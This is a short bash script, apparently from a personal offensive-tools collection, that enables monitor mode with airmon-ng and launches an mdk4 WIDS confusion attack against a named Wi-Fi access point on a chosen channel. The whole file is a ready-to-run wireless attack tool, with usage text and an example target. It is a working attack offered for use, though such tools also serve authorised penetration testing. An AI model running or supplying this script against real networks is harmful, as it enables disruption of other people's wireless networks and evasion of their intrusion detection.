#!/bin/bash

# Script to perform WIDS confusion attack via mdk4
# by D3Ext

function ctrl_c(){
  echo -e "\nAttack finished successfully"
  echo -e "Disabling monitor mode..."
  airmon-ng stop "${netCard}" &>/dev/null
  exit 0
}

if [ "$(id -u)" != "0" ]; then
  echo -e "Execute as root!"
  exit 0
fi

if [ "$1" ] && [ "$2" ] && [ "$3" ]; then
  trap ctrl_c INT

  echo -e "Enabling monitor mode..."
  airmon-ng start "$1" &>/dev/null; sleep 0.5

  if [ -d "/sys/class/net/$1" ]; then
    netCard="$1"
  elif [ -d "/sys/class/net/${1}mon" ]; then
    netCard="${1}mon"
  fi

  echo -e "Launching attack, press Ctrl + C to stop..."

  mdk4 "${netCard}" w -e "${2}" -c "${3}"
else
  echo -e "Usage: wids_confusion.sh <interface> <essid> <channel>"
  echo -e "\t<interface>: network interface in managed mode (i.e. wlan0)"
  echo -e "\t<essid>: target AP name"
  echo -e "\t<channel>: channel in which the AP is working on\n"
  echo -e "Example: wids_confusion.sh wlan0 TP-LINK2023 11"
  exit 0
fi

